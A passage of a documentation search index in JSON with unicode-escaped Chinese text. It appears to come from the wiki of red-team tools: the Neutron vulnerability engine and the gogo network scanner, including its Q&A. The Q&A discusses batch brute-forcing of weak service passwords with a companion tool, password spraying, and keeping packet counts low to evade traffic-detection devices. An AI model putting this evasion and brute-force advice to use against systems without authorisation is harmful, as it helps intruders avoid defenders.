API\u63a5\u53e3\uff0c\u652f\u6301HTTP/HTTPS\u534f\u8bae\u7684\u8de8\u8bed\u8a00\u8c03\u7528\u3002API\u8bbe\u8ba1\u9075\u5faaOpenAPI\u89c4\u8303\uff0c\u63d0\u4f9b\u5b8c\u6574\u7684\u63a5\u53e3\u6587\u6863\u548c\u793a\u4f8b\u4ee3\u7801\uff0c\u652f\u6301JSON\u683c\u5f0f\u7684\u8bf7\u6c42\u548c\u54cd\u5e94\u3002</p>"},{"location":"blog/whitepaper/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%99%BD%E7%9A%AE%E4%B9%A6/#\u7ed3\u8bed","title":"\u7ed3\u8bed","text":"<p>Neutron \u8f7b\u91cf\u7ea7\u6f0f\u6d1e\u9a8c\u8bc1\u5f15\u64ce\u4ee3\u8868\u4e86\u6f0f\u6d1e\u626b\u63cf\u6280\u672f\u7684\u91cd\u8981\u521b\u65b0\u65b9\u5411\u3002\u901a\u8fc7\u6781\u81f4\u7684\u8f7b\u91cf\u5316\u8bbe\u8ba1\u3001\u9ad8\u5ea6\u7684\u517c\u5bb9\u6027\u548c\u4f18\u5f02\u7684\u6027\u80fd\u8868\u73b0\uff0cNeutron \u4e3a\u73b0\u4ee3\u7f51\u7edc\u5b89\u5168\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f3a\u5927\u800c\u7075\u6d3b\u7684\u6f0f\u6d1e\u68c0\u6d4b\u57fa\u7840\u8bbe\u65bd\u3002</p> <p>\u5728\u4e91\u539f\u751f\u3001\u5bb9\u5668\u5316\u548c\u8d44\u6e90\u53d7\u9650\u73af\u5883\u65e5\u76ca\u666e\u53ca\u7684\u4eca\u5929\uff0cNeutron \u7684\u8f7b\u91cf\u5316\u7279\u6027\u4f7f\u5176\u5177\u5907\u72ec\u7279\u7684\u7ade\u4e89\u4f18\u52bf\u3002\u65e0\u8bba\u662f\u5185\u7f51\u6e17\u900f\u3001\u7ea2\u961f\u4f5c\u4e1a\u3001\u81ea\u52a8\u5316\u68c0\u6d4b\u8fd8\u662f\u4ea7\u54c1\u96c6\u6210\uff0cNeutron \u90fd\u80fd\u63d0\u4f9b\u7a33\u5b9a\u3001\u9ad8\u6548\u7684\u6f0f\u6d1e\u68c0\u6d4b\u80fd\u529b\u3002</p> <p>\u6211\u4eec\u76f8\u4fe1\uff0c\u5de5\u5177\u7684\u4ef7\u503c\u5728\u4e8e\u89e3\u51b3\u5b9e\u9645\u95ee\u9898\u3002Neutron \u5c06\u6301\u7eed\u6f14\u8fdb\uff0c\u5728\u4fdd\u6301\u8f7b\u91cf\u5316\u7279\u6027\u7684\u540c\u65f6\u4e0d\u65ad\u589e\u5f3a\u68c0\u6d4b\u80fd\u529b\uff0c\u4e3a\u7f51\u7edc\u5b89\u5168\u4ece\u4e1a\u8005\u63d0\u4f9b\u66f4\u597d\u7684\u5de5\u5177\u652f\u6301\uff0c\u52a9\u529b\u6784\u5efa\u66f4\u52a0\u5b89\u5168\u7684\u6570\u5b57\u73af\u5883\u3002</p> <p>Neutron \u5c06\u6301\u7eed\u8fed\u4ee3\uff0c\u4f9d\u6258\u5f00\u6e90\u793e\u533a\u7684\u8d21\u732e\u548c\u6301\u7eed\u7684\u6280\u672f\u521b\u65b0\uff0c\u6210\u4e3a\u8f7b\u91cf\u7ea7\u6f0f\u6d1e\u68c0\u6d4b\u9886\u57df\u7684\u6807\u6746\u4ea7\u54c1\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u6700\u4f18\u79c0\u7684\u5b89\u5168\u68c0\u6d4b\u4f53\u9a8c\u3002</p>"},{"location":"gogo/","title":"gogo \u00b7 index","text":""},{"location":"gogo/#overview","title":"overview","text":"<p>\u4e3a\u7ea2\u961f\u8bbe\u8ba1\u7684\u57fa\u4e8e\u7aef\u53e3\u7684\u5168\u80fd\u81ea\u52a8\u5316\u5f15\u64ce</p> <p>repo: https://github.com/chainreactors/gogo</p> <p>\u89c4\u5219\u5e93: https://github.com/chainreactors/gogo-templates</p> <p>\u4e0b\u8f7d: https://github.com/chainreactors/gogo/releases/latest</p> <p>\u5feb\u901f\u5165\u95e8: https://chainreactors.github.io/wiki/gogo/start/</p> <p>\u7406\u8bba\u4e0a\u652f\u6301\u5305\u62ecwindows 2003\u5728\u5185\u7684\u5168\u64cd\u4f5c\u7cfb\u7edf, release\u4e2d\u7684\u7248\u672c\u4f7f\u7528\u4e86go 1.17+ubuntu-latest\u4ee5\u53cagithub action\u81ea\u52a8\u7f16\u8bd1. \u51fa\u73b0\u8fc7\u5728\u8f83\u4f4e\u7cfb\u7edf\u7248\u672c\u4e0a\u65e0\u6cd5\u8fd0\u884c\u7684\u95ee\u9898. \u5982\u679c\u51fa\u73b0\u4e86\u517c\u5bb9\u4e0b\u95ee\u9898, \u53ef\u4ee5\u53c2\u8003\u6587\u6863\u4e2d\u7684\u7f16\u8bd1\u4e00\u8282\u81ea\u884c\u7f16\u8bd1</p> <p>Features.</p> <ul> <li>\u8ba9\u7ea2\u961f\u7684A\u6bb5(\u6216\u5927\u4e8eA\u6bb5)\u626b\u63cf\u6210\u4e3a\u53ef\u80fd</li> <li>\u652f\u6301\u4e3b\u52a8/\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b</li> <li>\u5173\u952e\u4fe1\u606f\u63d0\u53d6, \u5982title, cert \u4ee5\u53ca\u81ea\u5b9a\u4e49\u63d0\u53d6\u4fe1\u606f\u7684\u6b63\u5219</li> <li>\u652f\u6301nuclei poc, \u65e0\u5bb3\u5316\u7684\u626b\u63cf, \u6bcf\u4e2a\u6dfb\u52a0\u7684poc\u90fd\u7ecf\u8fc7\u4eba\u5de5\u5ba1\u6838</li> <li>\u81ea\u7531\u7ec4\u5408\u7684\u626b\u63cf\u903b\u8f91, \u9ad8\u5ea6\u53ef\u63a7\u7684\u626b\u63cf\u884c\u4e3a</li> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u6700\u5feb\u7684\u901f\u5ea6, \u5c3d\u53ef\u80fd\u5c0f\u7684\u5185\u5b58\u4e0eCPU\u5360\u7528.</li> <li>\u6700\u5c0f\u53d1\u5305\u539f\u5219, \u5c3d\u53ef\u80fd\u5c11\u5730\u53d1\u5305\u83b7\u53d6\u6700\u591a\u7684\u4fe1\u606f</li> <li>\u652f\u6301\u4e30\u5bcc\u7684DSL, \u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u914d\u7f6e\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684gogo</li> <li>\u5b8c\u5584\u7684\u8f93\u51fa\u4e0e\u8f93\u51fa\u8bbe\u8ba1</li> <li>\u51e0\u4e4e\u4e0d\u4f9d\u8d56\u7b2c\u4e09\u65b9\u5e93, \u7eaf\u539f\u751fgo\u7f16\u5199, \u652f\u6301\u5168\u529f\u80fd\u5168\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf</li> </ul>"},{"location":"gogo/#description\u57fa\u672c\u4fe1\u606f","title":"Description/\u57fa\u672c\u4fe1\u606f","text":"<p>gogo\u662f\u4e00\u6b3e\u51e0\u4e4e\u80fd\u89e3\u51b3\u4e00\u5207\u5185\u7f51\u81ea\u52a8\u5316\u64cd\u4f5c\u7684\u5de5\u5177, \u5e76\u975e\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u7f1d\u5408\u602a, \u4e5f\u4e0d\u662f\u4ec5\u4ec5\u5b9e\u73b0\u4e86\u529f\u80fd\u7684demo, \u800c\u662f\u4e00\u4e2a\u7ecf\u8fc7\u4e24\u5e74\u6253\u78e8, \u5bf9\u51e0\u4e4e\u6240\u6709\u573a\u666f(webshell, cs, \u591a\u7ea7\u4ee3\u7406\u7b49\u7b49)\u4e0b\u90fd\u6709\u5927\u91cf\u4f18\u5316\u7684 \u7ea2\u961f\u5411\u5de5\u5177. </p> <p>gogo\u5c06\u5185\u7f51\u81ea\u52a8\u5316 \u4ece\u67d0\u4e9b\u5de5\u5177\u7684\u4e00\u952e\u65e0\u8111\u64cd\u4f5c\u63d0\u5347\u5230\u6709\u76ee\u7684\u7684\u884c\u52a8\u7b56\u7565\u7ec4, \u51e0\u4e4e\u53ef\u4ee5\u5728\u6240\u6709\u5947\u602a\u590d\u6742\u573a\u666f\u4e0b\u901a\u8fc7\u7279\u5b9a\u7684\u53c2\u6570\u7ec4\u5408\u89e3\u51b3. \u751a\u81f3\u5728\u9ad8\u9632\u62a4\u7684\u5185\u7f51\u4e2d, \u4e5f\u80fd\u8fdb\u884c\u4e00\u5b9a\u7a0b\u5ea6\u7684\u89c4\u907f\u4e0e\u63a2\u6d4b. </p>"},{"location":"gogo/#memu\u76ee\u5f55","title":"Memu/\u76ee\u5f55","text":"<ol> <li>\u53c2\u6570\u4e0e\u529f\u80fd\u4ecb\u7ecd</li> <li>\u8bbe\u8ba1\u7406\u5ff5\u4e0e\u89e3\u51b3\u65b9\u6848 (\u5efa\u8bae\u4f18\u5148\u9605\u8bfb\u6b64\u7ae0)</li> <li>\u8bbe\u8ba1\u7ec6\u8282</li> <li>\u62d3\u5c55\u4e0e\u4e8c\u6b21\u5f00\u53d1</li> <li>\u5b9e\u6218\u4e0e\u5e94\u7528\u573a\u666f</li> </ol>"},{"location":"gogo/#background\u80cc\u666f","title":"Background/\u80cc\u666f","text":"<p>\u5f53\u6211\u4eec\u5f00\u59cb\u4ece\u4e8b\u7ea2\u961f\u5de5\u4f5c\u65f6, \u4e0d\u7ba1\u662f\u5185\u7f51\u63a2\u6d4b\u8fd8\u662f\u5916\u7f51\u4fe1\u606f\u6536\u96c6, \u90fd\u8fd8\u6ca1\u6709\u6210\u719f\u7684\u65b9\u6cd5\u8bba. </p> <p>\u5386\u53f2\u4e0a\u6709\u4e0d\u5c11\u7c7b\u4f3c\u7684\u5de5\u5177, masscan/nmap\u7684\u7aef\u53e3\u626b\u63cf, serverscan\u7528go\u5b9e\u73b0\u4e86\u90e8\u5206nmap\u7684\u529f\u80fd. \u4ee5\u53ca\u4e00\u4e9b\u56fe\u5f62\u5316\u7684\u5de5\u5177. </p> <p>\u4f46\u7ea2\u961f\u9762\u4e34\u7684\u573a\u666f\u662f\u590d\u6742\u7684, \u5e76\u975e\u6240\u6709\u60c5\u51b5\u90fd\u80fd\u672c\u673a\u63a5\u5165, \u8d85\u8fc790%\u7684\u573a\u666f\u90fd\u9700\u8981\u5728webshell/c2/\u4ee3\u7406\u4e0b\u64cd\u4f5c. \u90a3\u4e48\u975e\u843d\u5730\u7684\u5de5\u5177\u5c31\u4e0d\u80fd\u6ee1\u8db3\u7684\u6211\u4eec\u7684\u9700\u6c42\u4e86. </p> <p>\u6700\u5f00\u59cb, \u6709\u4e00\u4e9b\u4eba\u6253\u5305\u4e86\u5355\u6587\u4ef6\u7248\u672c\u7684masscan\u4e0enmap, \u4e0d\u8fc7\u5bf9\u7cfb\u7edf\u7684\u8981\u6c42\u5f88\u9ad8, \u53ea\u6709\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u624d\u80fd\u8fd0\u884c, \u540e\u6765\u6709\u4eba\u7528go\u5199\u4e86serverscan. \u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u89e3\u51b3\u4e86\u517c\u5bb9\u6027\u95ee\u9898. </p> <p>\u4f46serverscan\u4e5f\u662f\u7167\u7740nmap\u8bbe\u8ba1\u7684, \u5230\u4e86\u5b9e\u6218\u4e2d\u4f1a\u53d1\u73b0, \u6211\u4eec\u9700\u8981\u7684\u4e0d\u662f\u7aef\u53e3\u6307\u7eb9, \u800c\u662fhttp\u5e94\u7528\u7684\u6307\u7eb9\u4e0e\u4fe1\u606f. \u5e76\u4e14serverscan\u5728\u8bc6\u522b\u7aef\u53e3\u6307\u7eb9\u7684\u65f6\u5019\u6709\u5927\u91cf\u7684\u4e3b\u52a8\u53d1\u5305, \u901f\u5ea6\u6781\u6162, \u626b\u63cf\u7684\u8303\u56f4\u5f88\u96be\u8d85\u8fc7\u4e00\u4e2aC\u6bb5. </p> <p>\u4e8e\u662f\u6211\u4eec\u5f00\u59cb\u5c1d\u8bd5\u7f16\u5199\u4e00\u4e2a\u9002\u7528\u4e8e\u7ea2\u961f\u573a\u666f\u7684\u626b\u63cf\u5668.  \u5f53\u7136, \u8fd9\u4e2a\u65f6\u671f\u4e5f\u6709\u5f88\u591a\u540c\u884c\u4e5f\u9047\u5230\u4e86\u7c7b\u4f3c\u7684\u95ee\u9898, fscan, kscan, TailorScan\u7b49\u7b49\u626b\u63cf\u5668\u90fd\u662f\u5728\u8fd9\u4e2a\u9636\u6bb5\u8bde\u751f\u7684. </p> <p>gogo\u4e0e\u8fd9\u4e9b\u5de5\u5177\u540c\u6837\u7ecf\u5386\u4e86\u4e00\u4e24\u5e74\u7684\u53d1\u5c55\u8fed\u4ee3, \u5176\u5b9e\u5728\u7edd\u5927\u591a\u6570\u529f\u80fd\u4e0a\u5e76\u6ca1\u6709\u7a81\u7834\u6027\u7684\u5dee\u8ddd, \u66f4\u591a\u7684\u5dee\u8ddd\u662f\u5728\u7ec6\u8282\u4e0a\u7684\u4f18\u5316, \u552f\u4e00\u80fd\u505a\u5230\u8fdc\u8fdc\u9886\u5148\u7684\u5c31\u662fgogo\u7684\u53ef\u64cd\u63a7\u6027\u4e0e\u53ef\u62d3\u5c55\u6027. \u8fd9\u4e24\u4e2a\u7279\u6027\u8ba9gogo\u80fd\u591f\u505a\u5230\u5728\u540c\u6837\u529f\u80fd\u7684\u60c5\u51b5\u4e0b, \u80fd\u53d1\u73b0\u591a\u5f97\u591a\u7684\u6709\u6548\u6570\u636e. </p> <p>\u5728\u5f88\u591a\u6b21\u5b9e\u6218\u4e2d, \u6211\u4eec\u53d1\u73b0\u8fc7\u4f7f\u7528fscan\u7684\u53cb\u5546\u4e0e\u9776\u6807\u63d2\u80a9\u800c\u8fc7, \u539f\u56e0\u5f88\u7b80\u5355. fscan\u53cd\u9988\u592a\u5c11\u4e86, \u4f7f\u7528\u8005\u6ca1\u529e\u6cd5\u611f\u77e5\u5230fscan\u7684\u6f0f\u62a5. \u6216\u8005\u4e00\u65e6\u6709\u7f51\u7edc\u9694\u79bb, fscan\u53ea\u80fd\u4e00\u904d\u4e00\u904d\u91cd\u626b, \u4e00\u904d\u4e00\u904d\u5c1d\u8bd5\u4f5c\u7740\u5927\u91cf\u7684\u65e0\u7528\u529f. </p> <p>\u800c\u8fd9\u4e2a\u626b\u63cf\u5668\u7ecf\u8fc7\u4e24\u5e74\u7684\u6253\u78e8, \u6700\u7ec8\u5f62\u6001\u5c31\u662f\u73b0\u5728\u7684gogo. \u4ee5\u5de5\u4ef6(artifact)\u7684\u5f62\u6001, \u4f5c\u4e3a\u4e0e\u5176\u4ed6\u5de5\u5177\u8054\u52a8\u7684\u4e00\u73af, \u9ad8\u5ea6\u53ef\u63a7\u7684\u9ad8\u62d3\u5c55\u7684\u5185\u7f51\u81ea\u52a8\u5316\u5f15\u64ce. </p>"},{"location":"gogo/#qa","title":"Q&amp;A","text":"<p>\u4e3a\u4ec0\u4e48\u6ca1\u6709\u670d\u52a1\u7684\u53e3\u4ee4\u7206\u7834</p> <p>\u521a\u624d\u63d0\u5230\u4e86, \u5bf9web\u7aef\u9ed8\u8ba4\u53e3\u4ee4\u7684\u7206\u7834gogo\u53ef\u4ee5\u5b9e\u73b0, \u4f46\u6709\u5f88\u591a\u4eba\u95ee\u6211, \u4e3a\u4ec0\u4e48\u4e0d\u628assh, mysql\u4e4b\u7c7b\u7684\u7206\u7834\u4e5f\u505a\u8fdb\u53bb?</p> <p>\u6700\u521d\u6211\u4e5f\u662f\u8fd9\u4e48\u60f3\u7684, \u4f46\u662f\u8003\u8651\u5230\u52a0\u4e0a\u4e86\u8fd9\u4e9b\u529f\u80fd, \u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u4ee3\u7801\u4f1a\u53d8\u5f97\u81c3\u80bf, \u5e76\u4e14\u8fd9\u4e9b\u529f\u80fd\u5176\u5b9e\u53ef\u4ee5\u5df2\u53e6\u4e00\u79cd\u5f62\u5f0f\u5b9e\u73b0\u3002\u6700\u7ec8\u6211\u4eec\u51b3\u5b9a\u53e6\u8d77\u7089\u7076, \u7ef4\u62a4\u4e86\u53e6\u5916\u4e00\u4e2a\u5de5\u5177zombie, \u4e3b\u8981\u7528\u4e8e\u6279\u91cf\u7684\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834\u4e0e\u5229\u7528\u3002gogo\u4e0ezombie\u53ef\u4ee5\u8054\u52a8, gogo\u5bfc\u51fa\u7684zombie\u53ef\u8bc6\u522b\u7684\u683c\u5f0f, \u7136\u540e\u518d\u901a\u8fc7\u4ee3\u7406\u6216\u8005\u4e0a\u4f20zombie\u672c\u4f53\u8fdb\u884c\u7206\u7834\u3002</p> <p>\u8fd9\u4e5f\u662f\u53d8\u76f8\u9f13\u52b1\u4f7f\u7528\u8005\u4e0d\u8981\u5728\u5185\u7f51\u8fdb\u884c\u5927\u89c4\u6a21\u7684\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834, \u5927\u591a\u6570\u5382\u5546\u7684\u6d41\u91cf\u8bbe\u5907\u5bf9\u670d\u52a1\u5f31\u53e3\u4ee4\u7206\u7834\u662f\u5f88\u654f\u611f\u7684, \u5927\u591a\u6570\u90fd\u662f\u4e25\u91cd\u6216\u8005\u9ad8\u5371\u7684\u544a\u8b66\u3002gogo\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u8fdb\u884c\u9ad8\u901f\u7387\u7684http\u53d1\u5305, \u4e0d\u4f1a\u53d1\u9001poc, \u7ecf\u5e38\u4f1a\u88ab\u5176\u4ed6\u544a\u8b66\u6df9\u6ca1\u800c\u5ffd\u7565\u4e86gogo\u7684\u626b\u63cf\u884c\u4e3a\u3002\u5b9e\u9645\u4f7f\u7528\u4f53\u9a8c\u56e0\u4e3a\u9ad8\u901f\u7387\u53d1\u5305\u800c\u88ab\u53d1\u73b0\u7684\u60c5\u51b5\u8f83\u5c11\u3002</p> <p>\u901a\u8fc7gogo\u7684\u7b5b\u9009\u529f\u80fd\u4e0ezombie\u7684\u81ea\u5b9a\u4e49\u529f\u80fd, \u53ef\u4ee5\u5bf9\u60f3\u8981\u7206\u7834\u7684\u5bc6\u7801\u672c\u4e0e\u76ee\u6807\u8fdb\u884c\u7cbe\u51c6\u7ba1\u63a7, \u5c3d\u91cf\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u53d1\u5305\u4ee5\u89c4\u907f\u6d41\u91cf\u8bbe\u5907\u7684\u68c0\u6d4b\u3002\u5982\u679c\u6709\u53ef\u80fd, \u6700\u597d\u53ea\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12, \u800c\u975e\u7206\u7834\u3002</p> <p>\u5728\u6211\u4eec\u7684\u89c4\u5212\u4e2d, zombie\u80fd\u505a\u7684\u4e0d\u4ec5\u4ec5\u662f\u53e3\u4ee4\u7684\u7206\u7834, \u8fd8\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u81ea\u52a8\u5316\u7684\u5229\u7528, \u6bd4\u5982mysql\u7206\u7834\u4e4b\u540e, \u5224\u65ad\u4e0b\u662f\u5426\u662froot, \u6709\u591a\u5c11\u6570\u636e, \u81ea\u5b9a\u4e49\u7684\u547d\u4ee4\u6279\u91cf\u6267\u884c\u7b49\u7b49\u529f\u80fd\u3002\u6279\u91cf\u7684rce\u66f4\u4e0d\u662f\u68a6, \u53ea\u4e0d\u8fc7\u56e0\u4e3a\u5de5\u4f5c\u91cf\u95ee\u9898, \u8fd9\u90e8\u5206\u53ea\u80fd\u4e00\u5c0f\u5757\u4e00\u5c0f\u5757\u7684\u5b9e\u73b0, \u76ee\u524d\u7684zombie\u5df2\u7ecf\u652f\u6301\u4e86\u5341\u51e0\u79cd\u534f\u8bae, \u80fd\u8986\u76d6\u523090%\u4ee5\u4e0a\u7684hw\u4f7f\u7528\u573a\u666f\u3002\u8ba9\u62a4\u7f51\u4e0d\u518d\u662f\u4e00\u4e2a\u4e00\u4e2a\u767b\u5f55\u4e0a\u53bb\u622a\u56fe, \u800c\u662fgogo\u4e0ezombie\u7684\u5feb\u4e50\u8054\u52a8, \u5185\u7f51\u5237\u5206, \u4e00\u884c\u547d\u4ee4!</p> <p>\u53ef\u4ee5\u53d1\u73b0gogo\u4e0ezombie\u7684\u573a\u666f\u4e5f\u4e0d\u5b8c\u5168\u4e00\u81f4, zombie\u5b8c\u5168\u53ef\u4ee5\u653e\u5728\u5916\u7f51, \u901a\u8fc7\u4ee3\u7406\u63a5\u5165, \u51cf\u8f7bzombie\u5f15\u5165\u5927\u91cf\u5e93\u7684\u514d\u6740\u538b\u529b\u3002</p> <p>\u5728\u672a\u6765, \u6211\u6253\u7b97\u7f16\u5199\u4e00\u4e2agui\u754c\u9762\u7684\u7ed3\u679c\u89e3\u6790\u5668\u4e0e\u8054\u52a8\u5de5\u5177, \u4e5f\u53ef\u4ee5\u662f\u4e0ec2 webshell\u7684\u8054\u52a8, \u8fdb\u4e00\u6b65\u7b80\u5316\u64cd\u4f5c, \u8ba9gogo\u4e0ezombie\u7684\u8054\u52a8\u65e0\u7f1d\u8854\u63a5.</p> <p>\u547d\u4ee4\u884c\u53c2\u6570\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u590d\u6742?</p> <p>gogo\u7684\u547d\u4ee4\u884c\u5e76\u4e0d\u590d\u6742, \u590d\u6742\u7684\u662f\u8fdb\u9636\u529f\u80fd\u7684\u7ec4\u5408. \u5bf9\u4e8e\u7edd\u5927\u591a\u6570\u57fa\u7840\u573a\u666f, \u4f7f\u7528\u4e24\u4e09\u4e2a\u53c2\u6570\u5373\u53ef\u6784\u5efa\u626b\u63cf\u4efb\u52a1. \u5e76\u4e14\u5728\u66f4\u590d\u6742\u7684\u573a\u666f\u4e0a\u6dfb\u52a0\u4e86workflow\u7f13\u89e3\u8fd9\u4e00\u95ee\u9898. </p> <p>\u4e3a\u4ec0\u4e48gogo\u626b\u4e0d\u5230\u660e\u660e\u5b58\u5728\u7684\u76ee\u6807?</p> <p>\u539f\u56e0\u6709\u5f88\u591a, \u53ef\u80fd\u662f\u7cfb\u7edf\u8d44\u6e90\u8017\u5c3d(\u5e38\u5728windows\u548cmac\u4e0a\u51fa\u73b0); \u8def\u7531\u5668\u8fc7\u8f7d(\u751a\u81f3\u53ef\u80fd\u4f1a\u8fc7\u70ed\u91cd\u542f); \u7f51\u7edc\u73af\u5883\u5ef6\u8fdf\u8fc7\u9ad8(\u56fd\u5185\u626b\u56fd\u5916); \u6709\u5b89\u5168\u8bbe\u5907(\u81ea\u52a8\u5c01\u7981\u7b56\u7565) \u7b49\u7b49. \u5728\u5b9e\u6218\u4e2d\u9009\u62e9\u5408\u9002\u7684\u573a\u666f\u626b\u63cf\u5e76\u4e0d\u662f\u7b80\u5355\u7684\u4e8b. </p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u4f7f\u7528SYN\u626b\u63cf?</p> <p>SYN\u5feb\u662f\u4e00\u4e2a\u8bef\u533a, \u53ef\u80fd\u56e0\u4e3amasscan\u5f88\u5feb, masscan\u9ed8\u8ba4\u4f7f\u7528\u4e86SYN\u626b\u63cf, \u6240\u4ee5\u4e0b\u610f\u8bc6\u8ba4\u4e3aSYN\u80fd\u63d0\u9ad8\u626b\u63cf\u901f\u5ea6.\u5b9e\u9645\u4e0aSYN\u626b\u63cf\u5e76\u4e0d\u4f1a\u63d0\u9ad8\u626b\u63cf\u901f\u5ea6.</p> <p>\u5047\u8bbe\u67d0\u4e2a\u7aef\u53e3\u5173\u95ed, \u6211\u5411\u8be5\u7aef\u53e3\u53d1\u9001\u63e1\u624b\u5305\u7684\u7b2c\u4e00\u9636\u6bb5SYN\u5305. \u53ef\u80fd\u4f1adrop, \u4e5f\u53ef\u80fd\u4f1a\u56de\u590d\u4e00\u4e2aRST\u5305\u544a\u8bc9\u6211\u8be5\u7aef\u53e3\u5df2\u5173\u95ed.</p> <p>\u5047\u8bbe\u67d0\u4e2a\u7aef\u53e3\u5f00\u653e, \u540c\u6837\u662f\u53d1\u9001SYN\u5305, \u6536\u5230ACK\u56de\u590d, \u7136\u540e\u7ee7\u7eed\u5efa\u7acb\u540e\u7eed\u7684\u63e1\u624b.</p> <p>\u6211\u4eec\u4f1a\u53d1\u73b0, SYN\u626b\u63cf\u4e0e\u5168\u8fde\u63a5\u626b\u63cf\u90fd\u662f\u5148\u53d1\u9001\u4e00\u4e2aSYN\u5305, \u7136\u540e\u7b49\u5f85\u8fd4\u56de.\u5982\u679c\u7aef\u53e3\u5173\u95ed, \u7b49\u5f85\u7684\u65f6\u95f4\u90fd\u662f\u8bbe\u7f6e\u7684timeout\u65f6\u95f4.</p> <p>\u4e5f\u5c31\u662f\u8bf4, SYN\u626b\u63cf\u4e0eTCP\u5168\u626b\u63cf\u53ea\u6709\u5728\u7aef\u53e3\u5f00\u653e\u7684\u60c5\u51b5\u4e0b\u6709\u901f\u7387\u5dee\u5f02, \u800c\u5b9e\u9645\u4e0a\u5927\u89c4\u6a21\u7684\u7aef\u53e3\u626b\u63cf\u8fc7\u7a0b\u4e2d, \u7edd\u5927\u90e8\u5206\u7aef\u53e3\u90fd\u662f\u5173\u95ed\u7684.</p> <p>\u4e5f\u56e0\u4e3a\u7edd\u5927\u90e8\u5206\u7aef\u53e3\u662f\u5173\u95ed\u7684, gogo\u4e5f\u53ea\u4f1a\u53d1\u9001\u4e00\u4e2asyn\u5305, \u53ea\u6709\u83b7\u53d6\u76f8\u5e94\u4e4b\u540e\u624d\u4f1a\u5efa\u7acbTCP\u63e1\u624b.</p> <p>\u800c\u5982\u679c\u4f7f\u7528raw socket\u6700\u5927\u7684\u597d\u5904\u662f\u4e0d\u5360\u7528\u7cfb\u7edf\u7684fd, \u53ef\u4ee5\u7a81\u7834fd\u9650\u5236, \u4f46\u662f\u5c31\u7b97\u7a81\u7834\u4e86\u8fd9\u4e2a\u9650\u5236, \u4e5f\u8fd8\u4f1a\u6709\u6765\u81ea\u8def\u7531\u5668\u7684\u9650\u5236, \u8fd9\u4e2a\u5728\u8bbe\u8ba1\u6587\u6863\u4e2d\u5feb\u7684\u90a3\u90e8\u5206\u63d0\u5230\u8fc7.</p> <p>\u6240\u4ee5, SYN\u626b\u63cf\u4e0eTCP\u5168\u626b\u63cf\u5728\u7f51\u7edc\u4e0a\u662f\u540c\u6837\u7684\u6027\u80fd, \u53ea\u4f1a\u5728\u7cfb\u7edf\u7684\u6027\u80fd\u4e0a\u7565\u4f4e\u4e00\u70b9, \u800cTCP\u626b\u63cf\u6709\u66f4\u591a\u7684\u4f18\u52bf, \u540e\u9762\u4f1a\u63d0\u5230.</p> <p>\u6b64\u5916, \u5f15\u5165SYN\u626b\u63cf\u8fd8\u9700\u8981\u4f9d\u8d56pcap, \u5e76\u4e14\u4f9d\u8d56\u7279\u5b9a\u7684\u7cfb\u7edf\u7248\u672c, \u4f1a\u5bfc\u81f4\u5927\u91cf\u7684\u4f9d\u8d56\u95ee\u9898, \u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\u5e76\u4e0d\u597d\u7528.\u8fd9\u4e5f\u662f\u6211\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528naabu, \u9009\u62e9\u91cd\u65b0\u7f16\u5199gogo\u7684\u4e00\u90e8\u5206\u539f\u56e0.</p> <p>\u8981\u60f3SYN\u626b\u63cf\u901f\u5ea6\u8fbe\u5230masscan\u81ea\u79f0\u7684\u901f\u5ea6, \u9700\u8981\u63d0\u524d\u77e5\u9053\u7cfb\u7edf\u7684CPU/\u5185\u5b58\u4ee5\u53ca\u6700\u91cd\u8981\u7684\u5e26\u5bbd, \u7136\u540e\u505a\u51fa\u5bf9\u5e94\u7684\u914d\u7f6e\u624d\u80fd\u6253\u5230\u7406\u8bba\u901f\u5ea6, \u5b9e\u9645\u4e0a\u5728\u6e17\u900f\u7684\u65f6\u5019\u5f88\u96be\u63d0\u524d\u77e5\u9053\u8fd9\u4e9b\u6570\u503c, \u5e76\u4e14\u5c31\u7b97\u77e5\u9053\u4e86, \u914d\u7f6e\u8d77\u6765\u4e5f\u4f1a\u5f88\u9ebb\u70e6.</p> <p>\u6700\u7ec8\u5728socket\u4e0eraw socket\u4e4b\u95f4\u9009\u62e9\u4e86\u524d\u8005, raw socket\u5e26\u6765\u7684\u7279\u5b9a\u573a\u666f\u5fae\u5f31\u4f18\u52bf\u5e76\u4e0d\u4f1a\u6539\u53d8\u6574\u4f53\u7684\u6548\u7387.</p> <p>gogo\u662f\u600e\u4e48\u505a\u7684\uff1f</p> <p>gogo\u9996\u5148\u4f1a\u91c7\u7528socket\u5c1d\u8bd5\u5efa\u7acb\u8fde\u63a5, \u4e5f\u5c31\u662f\u7c7b\u4f3cSYN\u626b\u63cf\u7684\u573a\u666f.</p> <p>\u6210\u529f\u5efa\u7acb\u63e1\u624b\u540e, gogo\u4f1a\u53d1\u9001\u4e00\u4e2a\u6700\u57fa\u672c\u7684GET\u7684HTTP\u5305, \u6ce8\u610f, \u8fd9\u91cc\u4f7f\u7528\u7684\u662f\u521a\u624d\u5efa\u7acb\u7684TCP\u4fe1\u9053, \u800c\u4e0d\u662f\u4f7f\u7528HTTP\u5e93\u91cd\u65b0\u53d1\u5305, \u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u4e00\u6b21\u4e09\u6b21\u63e1\u624b.</p> <p>\u5982\u679c\u8fd4\u56de\u768430x\u72b6\u6001\u7801, \u5219\u4f1a\u4f7f\u7528net/HTTP\u5e93\u53d1\u9001\u4e00\u4e2a\u5b8c\u6574\u7684HTTP\u8bf7\u6c42, 